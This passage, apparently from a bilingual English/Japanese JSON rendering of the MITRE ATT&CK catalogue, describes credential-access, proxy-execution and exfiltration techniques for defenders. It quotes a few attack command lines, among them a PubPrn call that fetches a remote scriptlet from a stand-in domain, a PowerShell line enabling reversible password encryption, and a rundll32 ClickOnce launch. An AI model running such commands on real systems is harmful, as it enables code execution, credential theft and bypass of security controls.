                        "description_jp": "敵対者は、Windowsシステム上の認証情報へのアクセスを取得するために、Active Directory認証暗号化プロパティを悪用する可能性があります。<code>AllowReversiblePasswordEncryption</code>プロパティは、アカウントの可逆パスワード暗号化が有効か無効かを指定します。デフォルトではこのプロパティは無効になっており（代わりに一方向ハッシュ関数の出力としてユーザー認証情報を保存します）、レガシーまたは他のソフトウェアが必要としない限り有効にすべきではありません。(引用: store_pwd_rev_enc)\n\nプロパティが有効になっている場合、および/またはプロパティが有効になった後にユーザーがパスワードを変更した場合、攻撃者はプロパティが有効になった後に作成/変更されたパスワードの平文を取得できる可能性があります。パスワードを復号化するには、攻撃者は4つのコンポーネントが必要です：\n\n1. Active Directoryユーザー構造体<code>userParameters</code>からの暗号化されたパスワード（<code>G$RADIUSCHAP</code>）\n2. <code>userParameters</code>からの16バイトのランダム生成値（<code>G$RADIUSCHAPKEY</code>）\n3. グローバルLSAシークレット（<code>G$MSRADIUSCHAPKEY</code>）\n4. リモートアクセスサブ認証DLL（<code>RASSFM.DLL</code>）にハードコードされた静的キー\n\nこの情報により、攻撃者は暗号化キーを再現し、その後暗号化されたパスワード値を復号化できる可能性があります。(引用: how_pwd_rev_enc_1)(引用: how_pwd_rev_enc_2)\n\n攻撃者は、ローカルグループポリシーエディター、ユーザープロパティ、詳細パスワードポリシー（FGPP）、またはActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001)モジュールを介して、さまざまなスコープでこのプロパティを設定する場合があります。たとえば、ドメイン機能レベルが「Windows Server 2008」以上に設定されている場合、攻撃者はFGPPをユーザーまたはグループに実装して適用する場合があります。(引用：dump_pwd_dcsync) PowerShellでは、攻撃者は<code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>のようなコマンドを使用して、ユーザー設定に関連する変更を行う場合があります。"
                    },
                    {
                        "id": "T1556.003",
                        "name_eng": "Pluggable Authentication Modules",
                        "name_jp": "プラグ可能な認証モジュール",
                        "description_eng": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)",
                        "description_jp": "攻撃者は、プラグ可能な認証モジュール（PAM）を変更して、ユーザー資格情報にアクセスしたり、他の方法では保証されないアカウントへのアクセスを有効にしたりする可能性があります。PAMは、多くのサービスの認証をガイドする構成ファイル、ライブラリ、および実行可能ファイルのモジュラーシステムです。最も一般的な認証モジュールは<code>pam_unix.so</code>であり、<code>/etc/passwd</code>および<code>/etc/shadow</code>のアカウント認証情報を取得、設定、および検証します。(引用: Apple PAM)(引用: Man Pam_Unix)(引用: Red Hat PAM)\n\n攻撃者はPAMシステムのコンポーネントを変更してバックドアを作成する可能性があります。<code>pam_unix.so</code>などのPAMコンポーネントは、攻撃者が提供する任意の値を正当な資格情報として受け入れるようにパッチを適用できます。(引用: PAM Backdoor)\n\nPAMシステムの悪意のある変更は、認証情報を盗むためにも悪用される可能性があります。PAMはパスワードを保存しないため、PAMコンポーネントと交換される値は平文である可能性があるため、攻撃者は認証情報を収集するためにコードでPAMリソースに感染させる可能性があります。(引用: PAM Creds)(引用: Apple PAM)"
                    }
                ]
            },
            {
                "id": "T1216",
                "name_eng": "System Script Proxy Execution",
                "name_jp": "システムスクリプトプロキシ実行",
                "description_eng": "Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.(Citation: LOLBAS Project) This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker Bypass List)",
                "description_jp": "攻撃者は、証明書で署名されていることが多い信頼できるスクリプトを使用して、悪意のあるファイルの実行をプロキシする可能性があります。Microsoftからダウンロードされた、またはWindowsインストール時にデフォルトで含まれるいくつかのMicrosoft署名スクリプトは、他のファイルの実行をプロキシするために使用できます。(引用: LOLBAS Project) この動作は、システム上のアプリケーション制御と署名検証をバイパスする可能性のある悪意のあるファイルを実行するために、攻撃者によって悪用される可能性があります。(引用: GitHub Ultimate AppLocker Bypass List)",
                "subtechniques": [
                    {
                        "id": "T1216.001",
                        "name_eng": "PubPrn",
                        "name_jp": "PubPrn",
                        "description_eng": "Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)\n\nAdversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.\n\nIn later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).",
                        "description_jp": "攻撃者はPubPrnを使用して、悪意のあるリモートファイルの実行をプロキシする可能性があります。PubPrn.vbsは、プリンターをActive Directoryドメインサービスに公開する[Visual Basic](https://attack.mitre.org/techniques/T1059/005)スクリプトです。このスクリプトはMicrosoftによって署名されている可能性があり、通常、<code>Cscript.exe</code>を介して[Windowsコマンドシェル](https://attack.mitre.org/techniques/T1059/003)経由で実行されます。例えば、次のコードは指定されたドメイン内にプリンターを公開します：<code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>。(引用: pubprn)\n\n攻撃者はPubPrnを悪用して、リモートサイトでホストされている悪意のあるペイロードを実行する可能性があります。(引用: Enigma0x3 PubPrn Bypass) そうするために、攻撃者は2番目の<code>script:</code>パラメータを、リモートサイトでホストされているスクリプトレットファイル（.sct）を参照するように設定する可能性があります。コマンドの例は<code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>です。この動作は、このスクリプトの悪用を考慮していない署名検証制限およびアプリケーション制御ソリューションをバイパスする可能性があります。\n\nWindowsの新しいバージョン（10以降）では、<code>PubPrn.vbs</code>はリモートサイトからのプロキシ実行を防ぐように更新されています。これは、2番目のパラメータで指定されるプロトコルを、HTTP(S)経由でリモートコードを参照するために使用できる<code>script:</code>モニカではなく、<code>LDAP://</code>に制限することによって行われます。"
                    },
                    {
                        "id": "T1216.002",
                        "name_eng": "SyncAppvPublishingServer",
                        "name_jp": "SyncAppvPublishingServer",
                        "description_eng": "Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of malicious [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V).(Citation: 1 - appv) For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally.(Citation: 2 - appv)(Citation: 3 - appv)\n    \nThe SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from `\\System32` through the command line via `wscript.exe`.(Citation: 4 - appv)(Citation: 5 - appv)\n\nAdversaries may abuse SyncAppvPublishingServer.vbs to bypass [PowerShell](https://attack.mitre.org/techniques/T1059/001) execution restrictions and evade defensive counter measures by \"living off the land.\"(Citation: 6 - appv)(Citation: 4 - appv) Proxying execution may function as a trusted/signed alternative to directly invoking `powershell.exe`.(Citation: 7 - appv)\n\nFor example,  [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands may be invoked using:(Citation: 5 - appv)\n\n`SyncAppvPublishingServer.vbs \"n; {PowerShell}\"`",
                        "description_jp": "攻撃者はSyncAppvPublishingServer.vbsを悪用して、悪意のある[PowerShell](https://attack.mitre.org/techniques/T1059/001)コマンドの実行をプロキシする可能性があります。SyncAppvPublishingServer.vbsは、Windowsがアプリケーションを仮想化する方法（Microsoft Application Virtualization、またはApp-V）に関連付けられたVisual Basicスクリプトです。(引用: 1 - appv) 例えば、WindowsはWin32アプリケーションを仮想アプリケーションとしてユーザーにレンダリングし、ユーザーがローカルにインストールされているかのように起動して対話できるようにします。(引用: 2 - appv)(引用: 3 - appv)\n\nSyncAppvPublishingServer.vbsスクリプトは正当なものであり、Microsoftによって署名されている可能性があり、通常、<code>wscript.exe</code>を介してコマンドライン経由で<code>\\System32</code>から実行されます。(引用: 4 - appv)(引用: 5 - appv)\n\n敵対者は、SyncAppvPublishingServer.vbsを悪用して[PowerShell](https://attack.mitre.org/techniques/T1059/001)の実行制限を回避し、「Living Off the Land」によって防御的対抗策を回避するかもしれない。(引用：6 - appv）（引用：4 - appv）プロキシ実行は、`powershell.exe`を直接呼び出す代わりの、信頼できる/署名済みの代替手段として機能するかもしれない。(引用：7 - appv）\n\n例えば、[PowerShell](https://attack.mitre.org/techniques/T1059/001)コマンドは、次のようにして呼び出すことができます：（引用：5 - appv）\n\n<code>SyncAppvPublishingServer.vbs \"n; {PowerShell}\"</code>"
                    }
                ]
            },
            {
                "id": "T1211",
                "name_eng": "Exploitation for Defense Evasion",
                "name_jp": "防御回避のための悪用",
                "description_eng": "Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\n\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.\n\nThere have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries (Citation: Salesforce zero-day in facebook phishing attack), evade security logs (Citation: Bypassing CloudTrail in AWS Service Catalog), or deploy hidden infrastructure.(Citation: GhostToken GCP flaw)",
                "description_jp": "攻撃者は、セキュリティ機能をバイパスするために、システムまたはアプリケーションの脆弱性を悪用する可能性があります。脆弱性の悪用は、攻撃者がプログラム、サービス、またはオペレーティングシステムのソフトウェアやカーネル自体のプログラミングエラーを利用して、攻撃者が制御するコードを実行する場合に発生します。防御的なセキュリティソフトウェアには、それらを無効にしたり回避したりするために使用できる脆弱性が存在する可能性があります。\n\n敵対者は、偵察によって環境内にセキュリティソフトウェアが存在することを事前に知っているか、システムが侵害された際またはその直後に[セキュリティソフトウェアの発見](https://attack.mitre.org/techniques/T1518/001)のチェックを行う可能性がある。セキュリティソフトウェアは、おそらく直接悪用の標的となるだろう。永続的な脅威グループが検出を回避するためにウイルス対策ソフトウェアを標的とした例がある。\n\nSaaSアプリケーションのパブリッククラウドインフラストラクチャに、防御境界をバイパスしたり(引用：Salesforce zero-day in facebook phishing attack)、セキュリティログを回避したり(引用：Bypassing CloudTrail in AWS Service Catalog)、隠されたインフラストラクチャをデプロイしたり(引用：GhostToken GCP flaw)する可能性のある脆弱性の例も存在する。",
                "subtechniques": []
            },
            {
                "id": "T1127",
                "name_eng": "Trusted Developer Utilities Proxy Execution",
                "name_jp": "信頼できる開発者ユーティリティプロキシ実行",
                "description_eng": "Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.(Citation: engima0x3 DNX Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday WinDbg)(Citation: LOLBAS Tracker) These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.\n\nSmart App Control is a feature of Windows that blocks applications it considers potentially malicious from running by verifying unsigned applications against a known safe list from a Microsoft cloud service before executing them.(Citation: Microsoft Smart App Control) However, adversaries may leverage \"reputation hijacking\" to abuse an operating system’s trust of safe, signed applications that support the execution of arbitrary code. By leveraging [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127) to run their malicious code, adversaries may bypass Smart App Control protections.(Citation: Elastic Security Labs)",
                "description_jp": "攻撃者は、信頼できる開発者ユーティリティを利用して、悪意のあるペイロードの実行をプロキシする可能性があります。ソフトウェア開発関連のタスクに使用される多くのユーティリティがあり、これらは開発、デバッグ、リバースエンジニアリングを支援するためにさまざまな形式でコードを実行できます。(引用: engima0x3 DNX Bypass)(引用: engima0x3 RCSI Bypass)(引用: Exploit Monday WinDbg)(引用: LOLBAS Tracker) これらのユーティリティは、多くの場合、システム上で実行でき、信頼できるプロセスを介して悪意のあるコードの実行をプロキシし、アプリケーション制御ソリューションを効果的にバイパスできる正当な証明書で署名されています。\n\nSmart App Controlは、実行前にMicrosoftクラウドサービスからの既知の安全なリストに対して未署名のアプリケーションを検証することにより、潜在的に悪意のあると見なされるアプリケーションの実行をブロックするWindowsの機能です。(引用: Microsoft Smart App Control) しかし、攻撃者は、任意のコードの実行をサポートする安全で署名済みのアプリケーションに対するオペレーティングシステムの信頼を悪用する「評判ハイジャック」を利用する可能性があります。[信頼できる開発者ユーティリティプロキシ実行](https://attack.mitre.org/techniques/T1127)を利用して悪意のあるコードを実行することにより、攻撃者はSmart App Control保護をバイパスする可能性があります。(引用: Elastic Security Labs)",
                "subtechniques": [
                    {
                        "id": "T1127.001",
                        "name_eng": "MSBuild",
                        "name_jp": "MSBuild",
                        "description_eng": "Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.(Citation: MSDN MSBuild)\n\nAdversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.(Citation: MSDN MSBuild)(Citation: Microsoft MSBuild Inline Tasks 2017) MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.(Citation: LOLBAS Msbuild)",
                        "description_jp": "攻撃者はMSBuildを使用して、信頼できるWindowsユーティリティを介してコードの実行をプロキシする可能性があります。MSBuild.exe（Microsoft Build Engine）は、Visual Studioで使用されるソフトウェアビルドプラットフォームです。さまざまなプラットフォームと構成をロードおよびビルドするための要件を定義するXML形式のプロジェクトファイルを処理します。(引用: MSDN MSBuild)\n\n攻撃者はMSBuildを悪用して悪意のあるコードの実行をプロキシする可能性があります。.NETバージョン4で導入されたMSBuildのインラインタスク機能により、C#またはVisual BasicコードをXMLプロジェクトファイルに挿入できます。(引用: MSDN MSBuild)(引用: Microsoft MSBuild Inline Tasks 2017) MSBuildはインラインタスクをコンパイルして実行します。MSBuild.exeは署名済みのMicrosoftバイナリであるため、このように使用すると任意のコードを実行でき、MSBuild.exeの実行を許可するように構成されているアプリケーション制御防御をバイパスできます。(引用: LOLBAS Msbuild)"
                    },
                    {
                        "id": "T1127.002",
                        "name_eng": "ClickOnce",
                        "name_jp": "ClickOnce",
                        "description_eng": "Adversaries may use ClickOnce applications (.appref-ms and .application files) to proxy execution of code through a trusted Windows utility.(Citation: Burke/CISA ClickOnce BlackHat) ClickOnce is a deployment that enables a user to create self-updating Windows-based .NET applications (i.e, .XBAP, .EXE, or .DLL) that install and run from a file share or web page with minimal user interaction. The application launches as a child process of DFSVC.EXE, which is responsible for installing, launching, and updating the application.(Citation: SpectorOps Medium ClickOnce)\n\nBecause ClickOnce applications receive only limited permissions, they do not require administrative permissions to install.(Citation: Microsoft Learn ClickOnce) As such, adversaries may abuse ClickOnce to proxy execution of malicious code without needing to escalate privileges.\n\nClickOnce may be abused in a number of ways. For example, an adversary may rely on [User Execution](https://attack.mitre.org/techniques/T1204). When a user visits a malicious website, the .NET malware is disguised as legitimate software and a ClickOnce popup is displayed for installation.(Citation: NetSPI ClickOnce)\n\nAdversaries may also abuse ClickOnce to execute malware via a [Rundll32](https://attack.mitre.org/techniques/T1218/011) script using the command `rundll32.exe dfshim.dll,ShOpenVerbApplication1`.(Citation: LOLBAS /Dfsvc.exe)\n\nAdditionally, an adversary can move the ClickOnce application file to a remote user’s startup folder for continued malicious code deployment (i.e., [Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001)).(Citation: Burke/CISA ClickOnce BlackHat)(Citation: Burke/CISA ClickOnce Paper)",
                        "description_jp": "攻撃者はClickOnceアプリケーション（.appref-msおよび.applicationファイル）を使用して、信頼できるWindowsユーティリティを介してコードの実行をプロキシする可能性があります。(引用: Burke/CISA ClickOnce BlackHat) ClickOnceは、ユーザーが最小限のユーザー操作でファイル共有またはWebページからインストールして実行する、自己更新型のWindowsベースの.NETアプリケーション（.XBAP、.EXE、または.DLLなど）を作成できるようにする展開です。アプリケーションはDFSVC.EXEの子プロセスとして起動し、DFSVC.EXEはアプリケーションのインストール、起動、および更新を担当します。(引用: SpectorOps Medium ClickOnce)\n\nClickOnceアプリケーションは限定的な権限しか受け取らないため、インストールに管理者権限は必要ありません。(引用: Microsoft Learn ClickOnce) そのため、攻撃者は権限を昇格させる必要なく、ClickOnceを悪用して悪意のあるコードの実行をプロキシする可能性があります。\n\nClickOnceはいくつかの方法で悪用される可能性があります。例えば、攻撃者は[ユーザー実行](https://attack.mitre.org/techniques/T1204)に依存する可能性があります。ユーザーが悪意のあるウェブサイトにアクセスすると、.NETマルウェアは正当なソフトウェアになりすまし、ClickOnceポップアップが表示されてインストールされます。(引用: NetSPI ClickOnce)\n\n敵対者はまた、<code>rundll32.exe dfshim.dll,ShOpenVerbApplication1</code>コマンドを使用して、[Rundll32](https://attack.mitre.org/techniques/T1218/011)スクリプトを介してClickOnceを悪用してマルウェアを実行する可能性もある。(引用：LOLBAS /Dfsvc.exe）\n\nさらに、攻撃者はClickOnceアプリケーションファイルをリモートユーザーのスタートアップフォルダに移動して、継続的な悪意のあるコードの展開を行う可能性があります（つまり、[レジストリ実行キー/スタートアップフォルダ](https://attack.mitre.org/techniques/T1547/001)）。(引用: Burke/CISA ClickOnce BlackHat)(引用: Burke/CISA ClickOnce Paper)"
                    },
                    {
                        "id": "T1127.003",
                        "name_eng": "JamPlus",
                        "name_jp": "JamPlus",
                        "description_eng": "Adversaries may use `JamPlus` to proxy the execution of a malicious script. `JamPlus` is a build utility tool for code and data build systems. It works with several popular compilers and can be used for generating workspaces in code editors such as Visual Studio.(Citation: JamPlus manual)\n\nAdversaries may abuse the `JamPlus` build utility to execute malicious scripts via a `.jam` file, which describes the build process and required dependencies. Because the malicious script is executed from a reputable developer tool, it may subvert application control security systems such as Smart App Control.(Citation: Cyble)(Citation: Elastic Security Labs)",
                        "description_jp": "攻撃者は`JamPlus`を使用して、悪意のあるスクリプトの実行をプロキシする可能性があります。`JamPlus`は、コードおよびデータビルドシステム用のビルドユーティリティツールです。いくつかの一般的なコンパイラで動作し、Visual Studioなどのコードエディタでワークスペースを生成するために使用できます。(引用: JamPlus manual)\n\n攻撃者は、ビルドプロセスと必要な依存関係を記述する`.jam`ファイルを介して悪意のあるスクリプトを実行するために、`JamPlus`ビルドユーティリティを悪用する可能性があります。悪意のあるスクリプトは評判の良い開発者ツールから実行されるため、Smart App Controlなどのアプリケーション制御セキュリティシステムを破壊する可能性があります。(引用: Cyble)(引用: Elastic Security Labs)"
                    }
                ]
            }
        ]
    },
    {
        "id": "TA0010",
        "name_eng": "Exfiltration",
        "name_jp": "持ち出し",
        "description_eng": "The adversary is trying to steal data.\n\nExfiltration consists of techniques that adversaries may use to steal data from your network. Once they’ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.",
        "description_jp": "攻撃者はデータを盗もうとしています。\n\n持ち出しは、攻撃者がネットワークからデータを盗むために使用する可能性のあるテクニックで構成されます。データを収集した後、攻撃者は多くの場合、それを削除する際に検出を回避するためにパッケージ化します。これには圧縮と暗号化が含まれる場合があります。ターゲットネットワークからデータを持ち出すためのテクニックには、通常、コマンドアンドコントロールチャネルまたは代替チャネルを介して転送することが含まれ、送信にサイズ制限を設けることも含まれる場合があります。",
        "techniques": [
            {
                "id": "T1567",
                "name_eng": "Exfiltration Over Web Service",
                "name_jp": "Webサービス経由の持ち出し",
                "description_eng": "Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.\n\nWeb service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
                "description_jp": "攻撃者は、主要なコマンドアンドコントロールチャネルではなく、既存の正当な外部Webサービスを使用してデータを持ち出す可能性があります。持ち出しメカニズムとして機能する一般的なWebサービスは、侵害前にネットワーク内のホストが既にそれらと通信している可能性が高いため、かなりの隠れ蓑になる可能性があります。これらのサービスへのトラフィックを許可するために、ファイアウォールルールが既に存在する可能性もあります。\n\nWebサービスプロバイダーはまた、一般的にSSL/TLS暗号化を使用しており、これにより攻撃者は追加の保護レベルを得られます。",
                "subtechniques": [
                    {
                        "id": "T1567.001",
                        "name_eng": "Exfiltration to Code Repository",
                        "name_jp": "コードリポジトリへの持ち出し",
                        "description_eng": "Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.\n\nExfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.",
                        "description_jp": "攻撃者は、主要なコマンドアンドコントロールチャネル経由ではなく、コードリポジトリにデータを持ち出す可能性があります。コードリポジトリは、多くの場合API（例：https://api.github.com）経由でアクセスできます。これらのAPIへのアクセスは多くの場合HTTPS経由であり、これにより攻撃者は追加の保護レベルを得られます。\n\nコードリポジトリへのデータ持ち出しは、ネットワーク内のホストが既に利用している人気のサービスであれば、攻撃者にとってかなりの隠れ蓑にもなり得ます。"
                    },
                    {
                        "id": "T1567.003",
                        "name_eng": "Exfiltration to Text Storage Sites",
                        "name_jp": "テキストストレージサイトへの持ち出し",
                        "description_eng": "Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as <code>pastebin[.]com</code>, are commonly used by developers to share code and other information.  \n\nText storage sites are often used to host malicious code for C2 communication (e.g., [Stage Capabilities](https://attack.mitre.org/techniques/T1608)), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely.(Citation: Pastebin EchoSec)\n\n**Note:** This is distinct from [Exfiltration to Code Repository](https://attack.mitre.org/techniques/T1567/001), which highlight access to code repositories via APIs.",
                        "description_jp": "攻撃者は、主要なコマンドアンドコントロールチャネルの代わりに、テキストストレージサイトにデータを持ち出す可能性があります。<code>pastebin[.]com</code>などのテキストストレージサイトは、開発者がコードやその他の情報を共有するためによく使用されます。\n\nテキストストレージサイトは、C2通信のための悪意のあるコードをホストするためによく使用されますが（例：[能力のステージング](https://attack.mitre.org/techniques/T1608)）、攻撃者はこれらのサイトを使用して収集したデータを持ち出すこともあります。さらに、有料機能や暗号化オプションにより、攻撃者はデータをより安全に隠蔽して保存できる可能性があります。(引用: Pastebin EchoSec)\n\n**注:** これは、API経由でのコードリポジトリへのアクセスを強調する[コードリポジトリへのデータ持ち出し](https://attack.mitre.org/techniques/T1567/001)とは異なります。"
                    },
                    {
                        "id": "T1567.002",
                        "name_eng": "Exfiltration to Cloud Storage",
                        "name_jp": "クラウドストレージへの持ち出し",
                        "description_eng": "Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\n\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.",
                        "description_jp": "攻撃者は、主要なコマンドアンドコントロールチャネル経由ではなく、クラウドストレージサービスにデータを持ち出す可能性があります。クラウドストレージサービスでは、インターネット経由でリモートクラウドストレージサーバーからデータを保存、編集、取得できます。\n\nクラウドストレージサービスの例としては、DropboxやGoogle Docsなどがあります。ネットワーク内のホストが既にサービスと通信している場合、これらのクラウドストレージサービスへのデータ持ち出しは、攻撃者にとってかなりの隠れ蓑になる可能性があります。"
                    },
                    {
                        "id": "T1567.004",
                        "name_eng": "Exfiltration Over Webhook",
                        "name_jp": "Webhook経由の持ち出し",
                        "description_eng": "Adversaries may exfiltrate data to a webhook endpoint rather than over their primary command and control channel. Webhooks are simple mechanisms for allowing a server to push data over HTTP/S to a client without the need for the client to continuously poll the server.(Citation: RedHat Webhooks) Many public and commercial services, such as Discord, Slack, and `webhook.site`, support the creation of webhook endpoints that can be used by other services, such as Github, Jira, or Trello.(Citation: Discord Intro to Webhooks) When changes happen in the linked services (such as pushing a repository update or modifying a ticket), these services will automatically post the data to the webhook endpoint for use by the consuming application. \n\nAdversaries may link an adversary-owned environment to a victim-owned SaaS service to achieve repeated [Automated Exfiltration](https://attack.mitre.org/techniques/T1020) of emails, chat messages, and other data.(Citation: Push Security SaaS Attacks Repository Webhooks) Alternatively, instead of linking the webhook endpoint to a service, an adversary can manually post staged data directly to the URL in order to exfiltrate it.(Citation: Microsoft SQL Server)\n\nAccess to webhook endpoints is often over HTTPS, which gives the adversary an additional level of protection. Exfiltration leveraging webhooks can also blend in with normal network traffic if the webhook endpoint points to a commonly used SaaS application or collaboration service.(Citation: CyberArk Labs Discord)(Citation: Talos Discord Webhook Abuse)(Citation: Checkmarx Webhooks)",
                        "description_jp": "攻撃者は、主要なコマンドアンドコントロールチャネル経由ではなく、Webhookエンドポイントにデータを持ち出す可能性があります。Webhookは、クライアントがサーバーを継続的にポーリングする必要なく、サーバーがHTTP/S経由でクライアントにデータをプッシュできるようにするシンプルなメカニズムです。(引用: RedHat Webhooks) Discord、Slack、<code>webhook.site</code>など、多くのパブリックおよび商用サービスが、Github、Jira、Trelloなどの他のサービスで使用できるWebhookエンドポイントの作成をサポートしています。(引用: Discord Intro to Webhooks) リンクされたサービスで変更が発生すると（リポジトリの更新のプッシュやチケットの変更など）、これらのサービスは自動的にデータをWebhookエンドポイントに投稿し、消費側アプリケーションで使用できるようにします。\n\n攻撃者は、攻撃者が所有する環境を被害者が所有するSaaSサービスにリンクして、メール、チャットメッセージ、その他のデータの[自動持ち出し](https://attack.mitre.org/techniques/T1020)を繰り返し行う可能性があります。(引用: Push Security SaaS Attacks Repository Webhooks) あるいは、Webhookエンドポイントをサービスにリンクする代わりに、攻撃者はステージングされたデータをURLに直接手動で投稿して持ち出すことができます。(引用: Microsoft SQL Server)\n\nWebhookエンドポイントへのアクセスは多くの場合HTTPS経由であり、これにより攻撃者は追加の保護レベルを得られます。Webhookを利用したデータ持ち出しは、Webhookエンドポイントが一般的に使用されるSaaSアプリケーションまたはコラボレーションサービスを指している場合、通常のネットワークトラフィックに紛れ込む可能性もあります。(引用: CyberArk Labs Discord)(引用: Talos Discord Webhook Abuse)(引用: Checkmarx Webhooks)"
                    }
                ]
            },
            {
                "id": "T1029",
                "name_eng": "Scheduled Transfer",
                "name_jp": "スケジュールされた転送",
                "description_eng": "Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) or [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).",
                "description_jp": "攻撃者は、特定の時間帯または特定の間隔でのみ実行されるようにデータ持ち出しをスケジュールする可能性があります。これは、通常の活動や可用性とトラフィックパターンを調和させるために行われる可能性があります。\n\nスケジュールされた持ち出しが使用される場合、情報をネットワーク外に転送するために、[C2チャネル経由の持ち出し](https://attack.mitre.org/techniques/T1041)や[代替プロトコル経由の持ち出し](https://attack.mitre.org/techniques/T1048)など、他の持ち出しテクニックも同様に適用される可能性があります。",
                "subtechniques": []
            },
            {
                "id": "T1011",
                "name_eng": "Exfiltration Over Other Network Medium",
                "name_jp": "他のネットワーク媒体経由の持ち出し",
                "description_eng": "Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.\n\nAdversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
